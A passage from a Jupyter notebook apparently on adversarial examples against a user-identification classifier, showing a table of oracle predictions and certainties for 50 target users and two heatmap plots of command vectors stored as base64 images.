              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>6</th>\n",
              "      <td>43</td>\n",
              "      <td>6</td>\n",
              "      <td>6</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>7</th>\n",
              "      <td>43</td>\n",
              "      <td>7</td>\n",
              "      <td>12</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>8</th>\n",
              "      <td>43</td>\n",
              "      <td>8</td>\n",
              "      <td>8</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>9</th>\n",
              "      <td>43</td>\n",
              "      <td>9</td>\n",
              "      <td>9</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>10</th>\n",
              "      <td>43</td>\n",
              "      <td>10</td>\n",
              "      <td>20</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>11</th>\n",
              "      <td>43</td>\n",
              "      <td>11</td>\n",
              "      <td>11</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>12</th>\n",
              "      <td>43</td>\n",
              "      <td>12</td>\n",
              "      <td>12</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>13</th>\n",
              "      <td>43</td>\n",
              "      <td>13</td>\n",
              "      <td>44</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>14</th>\n",
              "      <td>43</td>\n",
              "      <td>14</td>\n",
              "      <td>14</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>15</th>\n",
              "      <td>43</td>\n",
              "      <td>15</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>16</th>\n",
              "      <td>43</td>\n",
              "      <td>16</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>17</th>\n",
              "      <td>43</td>\n",
              "      <td>17</td>\n",
              "      <td>11</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>18</th>\n",
              "      <td>43</td>\n",
              "      <td>18</td>\n",
              "      <td>18</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>19</th>\n",
              "      <td>43</td>\n",
              "      <td>19</td>\n",
              "      <td>19</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>20</th>\n",
              "      <td>43</td>\n",
              "      <td>20</td>\n",
              "      <td>20</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>21</th>\n",
              "      <td>43</td>\n",
              "      <td>21</td>\n",
              "      <td>11</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>22</th>\n",
              "      <td>43</td>\n",
              "      <td>22</td>\n",
              "      <td>22</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>23</th>\n",
              "      <td>43</td>\n",
              "      <td>23</td>\n",
              "      <td>23</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>24</th>\n",
              "      <td>43</td>\n",
              "      <td>24</td>\n",
              "      <td>35</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>25</th>\n",
              "      <td>43</td>\n",
              "      <td>25</td>\n",
              "      <td>0</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>26</th>\n",
              "      <td>43</td>\n",
              "      <td>26</td>\n",
              "      <td>26</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>27</th>\n",
              "      <td>43</td>\n",
              "      <td>27</td>\n",
              "      <td>27</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>28</th>\n",
              "      <td>43</td>\n",
              "      <td>28</td>\n",
              "      <td>9</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>29</th>\n",
              "      <td>43</td>\n",
              "      <td>29</td>\n",
              "      <td>38</td>\n",
              "      <td>0.997517</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>30</th>\n",
              "      <td>43</td>\n",
              "      <td>30</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>31</th>\n",
              "      <td>43</td>\n",
              "      <td>31</td>\n",
              "      <td>12</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>32</th>\n",
              "      <td>43</td>\n",
              "      <td>32</td>\n",
              "      <td>32</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>33</th>\n",
              "      <td>43</td>\n",
              "      <td>33</td>\n",
              "      <td>14</td>\n",
              "      <td>0.560974</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>34</th>\n",
              "      <td>43</td>\n",
              "      <td>34</td>\n",
              "      <td>11</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>35</th>\n",
              "      <td>43</td>\n",
              "      <td>35</td>\n",
              "      <td>35</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>36</th>\n",
              "      <td>43</td>\n",
              "      <td>36</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>37</th>\n",
              "      <td>43</td>\n",
              "      <td>37</td>\n",
              "      <td>37</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>38</th>\n",
              "      <td>43</td>\n",
              "      <td>38</td>\n",
              "      <td>49</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>39</th>\n",
              "      <td>43</td>\n",
              "      <td>39</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>40</th>\n",
              "      <td>43</td>\n",
              "      <td>40</td>\n",
              "      <td>8</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>41</th>\n",
              "      <td>43</td>\n",
              "      <td>41</td>\n",
              "      <td>12</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>42</th>\n",
              "      <td>43</td>\n",
              "      <td>42</td>\n",
              "      <td>12</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>43</th>\n",
              "      <td>43</td>\n",
              "      <td>43</td>\n",
              "      <td>1</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>44</th>\n",
              "      <td>43</td>\n",
              "      <td>44</td>\n",
              "      <td>44</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>45</th>\n",
              "      <td>43</td>\n",
              "      <td>45</td>\n",
              "      <td>45</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>46</th>\n",
              "      <td>43</td>\n",
              "      <td>46</td>\n",
              "      <td>12</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>47</th>\n",
              "      <td>43</td>\n",
              "      <td>47</td>\n",
              "      <td>19</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>48</th>\n",
              "      <td>43</td>\n",
              "      <td>48</td>\n",
              "      <td>48</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>49</th>\n",
              "      <td>43</td>\n",
              "      <td>49</td>\n",
              "      <td>39</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "    Original User  Target User  Oracle Prediction  Oracle Certainty\n",
              "0              43            0                  0          1.000000\n",
              "1              43            1                  1          1.000000\n",
              "2              43            2                  2          1.000000\n",
              "3              43            3                  2          1.000000\n",
              "4              43            4                  2          1.000000\n",
              "5              43            5                  5          1.000000\n",
              "6              43            6                  6          1.000000\n",
              "7              43            7                 12          1.000000\n",
              "8              43            8                  8          1.000000\n",
              "9              43            9                  9          1.000000\n",
              "10             43           10                 20          1.000000\n",
              "11             43           11                 11          1.000000\n",
              "12             43           12                 12          1.000000\n",
              "13             43           13                 44          1.000000\n",
              "14             43           14                 14          1.000000\n",
              "15             43           15                  2          1.000000\n",
              "16             43           16                  2          1.000000\n",
              "17             43           17                 11          1.000000\n",
              "18             43           18                 18          1.000000\n",
              "19             43           19                 19          1.000000\n",
              "20             43           20                 20          1.000000\n",
              "21             43           21                 11          1.000000\n",
              "22             43           22                 22          1.000000\n",
              "23             43           23                 23          1.000000\n",
              "24             43           24                 35          1.000000\n",
              "25             43           25                  0          1.000000\n",
              "26             43           26                 26          1.000000\n",
              "27             43           27                 27          1.000000\n",
              "28             43           28                  9          1.000000\n",
              "29             43           29                 38          0.997517\n",
              "30             43           30                  2          1.000000\n",
              "31             43           31                 12          1.000000\n",
              "32             43           32                 32          1.000000\n",
              "33             43           33                 14          0.560974\n",
              "34             43           34                 11          1.000000\n",
              "35             43           35                 35          1.000000\n",
              "36             43           36                  2          1.000000\n",
              "37             43           37                 37          1.000000\n",
              "38             43           38                 49          1.000000\n",
              "39             43           39                  2          1.000000\n",
              "40             43           40                  8          1.000000\n",
              "41             43           41                 12          1.000000\n",
              "42             43           42                 12          1.000000\n",
              "43             43           43                  1          1.000000\n",
              "44             43           44                 44          1.000000\n",
              "45             43           45                 45          1.000000\n",
              "46             43           46                 12          1.000000\n",
              "47             43           47                 19          1.000000\n",
              "48             43           48                 48          1.000000\n",
              "49             43           49                 39          1.000000"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 60
        }
      ]
    },
    {
      "metadata": {
        "id": "9SUkSJc2u67k",
        "colab_type": "code",
        "outputId": "fc274207-3d71-4470-c2f2-f5dbfa76b268",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 357
        }
      },
      "cell_type": "code",
      "source": [
        "plot_command_vector(adversary_test_inputs[0])"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<matplotlib.axes._subplots.AxesSubplot at 0x7fe5f86232e8>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 61
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "iVBORw0KGgoAAAANSUhEUgAAAa0AAAFDCAYAAACJGFHFAAAABHNCSVQICAgIfAhkiAAAAAlwSFlz\nAAALEgAACxIB0t1+/AAAADl0RVh0U29mdHdhcmUAbWF0cGxvdGxpYiB2ZXJzaW9uIDMuMC4zLCBo\ndHRwOi8vbWF0cGxvdGxpYi5vcmcvnQurowAAEYlJREFUeJzt3W9sndV9B/DvtZOQBGdpLPmqQEDN\nrGYZYdGaUSRqRCRmd1mh2qQhxQiVqqCWTkhdoUxrXQ23gN1Ug0hT1Be06l60oNQSs1i7aUQVo1sV\njJwiNSxhDOKthlAU+zYlnZdkEHr3oq1LSnJzY3yTnOTzia7kh+fc42Px58vvPD+fW6nX6/UAQAHa\nzvQCAKBZQguAYggtAIohtAAohtACoBhCC4BiCC0AWuqFF15Ib29vHn744bfde+qpp3LjjTdm06ZN\n+cpXvnLSuYQWAC1z6NCh3Hfffbn66quPe//+++/P1q1bs23btuzYsSN79+5tOJ/QAqBlFi1alK99\n7WupVqtvu/fyyy9n+fLlueiii9LW1pYNGzZkbGys4XxCC4CWWbBgQRYvXnzce9PT0+ns7Jy97uzs\nzPT0dOP55nV1ABSp0rdyzu+tf3ffPK6kMaEFQFKpnPZvWa1WU6vVZq/3799/3G3Et7I9CMAZsXLl\nyszMzGTfvn05evRonnzyyfT09DR8j0oLgJaVMLt3786Xv/zlvPLKK1mwYEG2b9+e6667LitXrkxf\nX1++8IUv5DOf+UyS5EMf+lBWrVrVcL6KjyYBoPLHl835vfV/fmkeV9KYSguA5PQ/0poToQXAGWnE\nmAuhBUAxbXlCC4Bzo9I68uah07UO4Bxx1UP9TY8dv/1b5+waWmFx+9IzvYQzTqUFgEYMAArSVkZq\nCS0AVFoAFORcaMQA4DxRRmaV0pkPACotABKNGAAUpIzMEloARCMGAAUpZHuw4edpOcaJU7Fk4+qm\nxx5+/IUWrgTOTa08xqly83vn/N76Iy/O40oaU2kBUMz2oJZ3AIqh0gJA9yAABSmkEUNoAaDSAqAg\nhTRiCC0AimnLE1oAFFNpFZKtAKDSAiDRiMH552w4mumqh/qbHjt++7dauBKa4e/XWaSQ7UGhBUAx\nD4uEFgAqLQAKUkZmCS0AUswxToXsYgKASguAxDMtAApSRmYJLQCSikoLgFIILQCKUUhmpVKv1+sn\nunnkzUOncy3AabZk4+qmxp0NR3SRLG5f2rK5F931+3N+7+tbfjiPK2lMyzsAxbA9CIBnWgCUQ2gB\nUAyhBUAxCsksoQWASguAgpQSWlreASiGSguAVAo5MVdowXnMSRf8Sinbg0ILAN2DAJSjrZDUEloA\n2B4EoBytDK3h4eHs2rUrlUolAwMDWbdu3ey9Rx55JN/+9rfT1taWK664Ip///OcbzqXlHYCWGR8f\nz+TkZEZGRjI0NJShoaHZezMzM/n617+eRx55JNu2bcvExER++MPGH3MitABIpTL3VyNjY2Pp7e1N\nknR3d+fgwYOZmZlJkixcuDALFy7MoUOHcvTo0Rw+fDjLly9vOJ/tQQBatj1Yq9Wydu3a2evOzs5M\nT0+no6MjF1xwQe6444709vbmggsuyPXXX59Vq1Y1nE+lBUAqlcqcX6eiXq/Pfj0zM5OHHnoojz/+\neJ544ons2rUrzz//fMP3Cy0AWhZa1Wo1tVpt9npqaipdXV1JkomJiVx66aXp7OzMokWLcuWVV2b3\n7t0N5xNaALQstHp6erJ9+/YkyZ49e1KtVtPR0ZEkueSSSzIxMZEjR44kSXbv3p33vOc9Deebt2da\nSzaubmqcY2MAzj6t6nhfv3591q5dm/7+/lQqlQwODmZ0dDTLli1LX19fbrvtttxyyy1pb2/P+973\nvlx55ZWN11l/6wbjbzjy5qGmFya0AFprcfvSls190X3Xzvm9r/71v83jShrTPQiAEzEAKIfQAqAY\nDswFoBiFZJbQAsD2IAAFqaSM0PLLxQAUQ6UFgO1BAMpx3oVWsyddNHtyxqnMCcA7U0hmqbQAOA8r\nLQDKJbQAKEYpoaXlHYBiqLQA0IgBQDlK2R4UWgAILQDKIbQAKEYhmSW0AFBpndC5ejTTLdvvanrs\nN/5oSwtXAvPvVP75PhX+XeBUqbQAUGkBUA6hBUAxCsksoQWASguAkggtAEpRSqXllHcAiqHSAqCU\n3UGhBUA524NCC4BiQqtSr9frJ7p55M1Dp3MtAKfdko2rmxp3NhxBt7h9acvmfv/f3Tjn9+689dF5\nXEljKi0APNMCoBylbA9qeQegGCotAIqptIQWAEILgHIILQCKUUhmCS0AVFoAFKSU0NLyDkAxzstK\n66qH+pseO377t87YnEDrnQ3HM50NSqm0zsvQAuBYhWSW0AJApQVASYQWAKVQaQFQjLYyMkvLOwDl\nUGkBYHsQgHK0CS0AStHKSmt4eDi7du1KpVLJwMBA1q1bN3vv1VdfzV133ZU33ngjl19+ee69996G\nc52XodWKEymccnF2WLJxddNjnYQAv9aqBofx8fFMTk5mZGQkExMTGRgYyMjIyOz9zZs359Zbb01f\nX1+++MUv5sc//nEuvvji075OAArSVqnM+dXI2NhYent7kyTd3d05ePBgZmZmkiQ///nP88wzz+S6\n665LkgwODjYMrERoAZBfbA/O9dVIrVbLihUrZq87OzszPT2dJDlw4EAuvPDCfOlLX8pNN92UBx98\n8KTrFFoAnDb1ev2Yr/fv359bbrklDz/8cJ577rl873vfa/h+oQVAy7YHq9VqarXa7PXU1FS6urqS\nJCtWrMjFF1+cyy67LO3t7bn66qvz4osvNl7nO/9RAShdq7YHe3p6sn379iTJnj17Uq1W09HRkSRZ\nsGBBLr300vzoRz+avb9q1aqG852X3YMAHKtVFcz69euzdu3a9Pf3p1KpZHBwMKOjo1m2bFn6+voy\nMDCQz372s6nX61m9evVsU8aJVOpv3WD8DUfePDTvPwC0kpZ3zmWL25e2bO4/+8dPzPm9f3/DV+dx\nJY2ptABwjBMA5SjlGCeNGAAUQ6XFOcVzKpibMuosoQVAytkeFFoACC0AyqF7EIBiqLQAKEYZkaXl\nHYCCqLQAsD0IQDmEFgDF0D0IQDFUWpzQc6892/TYy9+1roUrmV+vvX6g6bHvWtTZwpWce/7ppX9o\neuz1l/1JC1dCM5bc/gdNjz380DMtXEnzyogsoQVAyqm0tLwDUAyVFgDFVFpCCwDdgwCUo5RnRUIL\nAJUWAOXwTAuAYpQSWqVsYwKASguA8/CZ1sZHP9HUuMdv/Op8fctilXQ006lwNFPrtOpopgP/N93U\nuM4Lulry/U/Fmr/5cNNjn//L77RwJSd3thzNdCraCjnISaUFwPlXaQFQrlIaMYQWAKnYHgSgFKVs\nD2p5B6AYKi0APNMCoByVQjbehBYAKi0AylFKI4bQAuD8a3l3PBOU52w4nqlZZ/popnNdKduDZTx5\nA4DYHgQgnmkBUJC2QjbehBYAKi0AyiG0ACiGD4EEoBilVFplPHkDgKi0AEg5v1wstAA4/45xAqBc\nbZUynhYJLQCKacQQWgAUsz1YRj0IABFaAOQX3YNzfZ3M8PBwNm3alP7+/jz77LPHHfPggw/mIx/5\nyEnnsj0IQMu2B8fHxzM5OZmRkZFMTExkYGAgIyMjx4zZu3dvdu7cmYULF550PpUWAC2rtMbGxtLb\n25sk6e7uzsGDBzMzM3PMmM2bN+fOO+9sbp1z+/EAOJdUKm1zfjVSq9WyYsWK2evOzs5MT0/PXo+O\njuaqq67KJZdc0tQ6hRYAqbyDP6eiXq/Pfv3aa69ldHQ0H/vYx5p+v2daALTsGKdqtZparTZ7PTU1\nla6uriTJ008/nQMHDuTmm2/O66+/npdeeinDw8MZGBg44XxCi/PWzumnmhr3/q4PtOT7X3pvX9Nj\nX77nuy1Zw1/864n/4/BWf7thuCXfn3NfT09Ptm7dmv7+/uzZsyfVajUdHR1Jko0bN2bjxo1Jkn37\n9uVzn/tcw8BKhBYAad2JGOvXr8/atWvT39+fSqWSwcHBjI6OZtmyZenra/5/3H5FaAHQ0g+BvPvu\nu4+5XrNmzdvGrFy5Mt/85jdPOpfQAsDZgwCU42St62cLoQVAS7cH55PQAqCY7cEy6kEAiEoLgJTz\neVpCC4BitgeFFgDFNGJU6m89vfA3HHnz0OlcCwANLG5f2rK5RyZO/ou9J7Kp++Qf3jhfVFoAeKYF\nQDlKeaal5R2AYqi0ALA9CEA5StkeFFoAFNPyLrQAUGkBUI5KIX15QguAYiqtMqIVAKLSOiOW3PR7\nTY89vO3fmx77xCuPNz32Dy/Z2PRY4Nyn5R2AYrQVsj0otABQaQFQjlIaMYQWAFreAShHKZVWGdEK\nAFFpARBnDwJQkFK2B4UWAFreASiHSosTOpWjmf7rf15oeuyZPpppyZ/+btNjDz/2Hy1cSRl+9sZr\nTY/9rYXvauFKQMs7AAUp5RinMqIVAKLSAiAaMQAoiEYMAIqh0gKgGCotAIrRVkhfntACoJhKq4xo\nBYCotACIRgzmyW8vW32ml9A0RzOdGkczcTYpZXtQaAGg0gKgHEILgHLYHgSgFKVUWlreASiGSgsA\n3YMAlKOU7UGhBYDQAqAcrdweHB4ezq5du1KpVDIwMJB169bN3nv66aezZcuWtLW1ZdWqVRkaGkpb\n24nbLYQWJ/Xn//JXTY279wN3Nj3nFUM3NT12/31PNj0WmJtWVVrj4+OZnJzMyMhIJiYmMjAwkJGR\nkdn799xzT77xjW/k3e9+dz71qU/l+9//fjZs2HDC+YQWAC0LrbGxsfT29iZJuru7c/DgwczMzKSj\noyNJMjo6Ovt1Z2dnfvrTnzacT8s7AC1Tq9WyYsWK2evOzs5MT0/PXv8qsKamprJjx46GVVai0gIg\np6/lvV6vv+2v/eQnP8knP/nJDA4OHhNwxyO0AGjZ9mC1Wk2tVpu9npqaSldX1+z1zMxMPv7xj+fT\nn/50rrnmmpPOZ3sQgFQqlTm/Gunp6cn27duTJHv27Em1Wp3dEkySzZs356Mf/Wiuvfbaptap0gKg\nZZXW+vXrs3bt2vT396dSqWRwcDCjo6NZtmxZrrnmmjz22GOZnJzMo48+miS54YYbsmnTphPOJ7QA\naOkvF999993HXK9Zs2b26927d5/SXEILgGLOHvRMC4BiqLQAKObswUr9eE3zv3TkzUOncy1vs+TD\na04+6JcOf+f5Fq5kfk387D+bHtv9W7/TwpUAJVncvrRlc794cM+c3/ve5WvncSWNqbQAKOaZltAC\nIClke1BoAaDSAqAcpTRiaHkHoBgqLQCKqbSEFgCeaQFQDpUWAMUQWgAUo5TtwbP6GCcAfq2Vxzjt\n+9//nvN7V164ah5X0piWdwCKYXsQgGK2B4UWABoxACiJ0AKgEGVEltACIJ5pAVCUMkJLyzsAxVBp\nAVBInSW0AEhSSmwJLQCKacTwTAuAYqi0AHAiBgDlKCW0bA8CUAyhBUAxbA8CoHsQAOabSguAYhox\nhBYAcSIGAMUoI7I80wKgICotAIrpHhRaAKSUDUKhBUAhkSW0AEhSSmwJLQCKeaalexCAYggtAIph\nexAAxzgBUJJzILQWty89XesA4AwqI7JUWgCknO5BoQVASqm1hBYAhUSWlncACqLSAiCtrLWGh4ez\na9euVCqVDAwMZN26dbP3nnrqqWzZsiXt7e259tprc8cddzScS6UFQCqVypxfjYyPj2dycjIjIyMZ\nGhrK0NDQMffvv//+bN26Ndu2bcuOHTuyd+/ehvMJLQBaZmxsLL29vUmS7u7uHDx4MDMzM0mSl19+\nOcuXL89FF12Utra2bNiwIWNjYw3nE1oApPIO/jRSq9WyYsWK2evOzs5MT08nSaanp9PZ2Xnceyfi\nmRYAp+0wiXq9/o7er9ICoGWq1Wpqtdrs9dTUVLq6uo57b//+/alWqw3nE1oAtExPT0+2b9+eJNmz\nZ0+q1Wo6OjqSJCtXrszMzEz27duXo0eP5sknn0xPT0/D+Sr1d1qrAUADDzzwQH7wgx+kUqlkcHAw\nzz33XJYtW5a+vr7s3LkzDzzwQJLkgx/8YG677baGcwktAIphexCAYggtAIohtAAohtACoBhCC4Bi\nCC0AiiG0ACiG0AKgGP8PrKZu5ERULWkAAAAASUVORK5CYII=\n",
            "text/plain": [
              "<Figure size 576x396 with 2 Axes>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "LlZG6VThu-CL",
        "colab_type": "code",
        "outputId": "d3a615a6-bf9b-41c2-f856-cde6044765e2",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 357
        }
      },
      "cell_type": "code",
      "source": [
        "plot_command_vector(adversarial_examples[0], danger=True)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<matplotlib.axes._subplots.AxesSubplot at 0x7fe5f83e7e48>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 62
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "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\nGwV7XScIvlwMAIhGJDmLpAUAiOeaFre8AwCi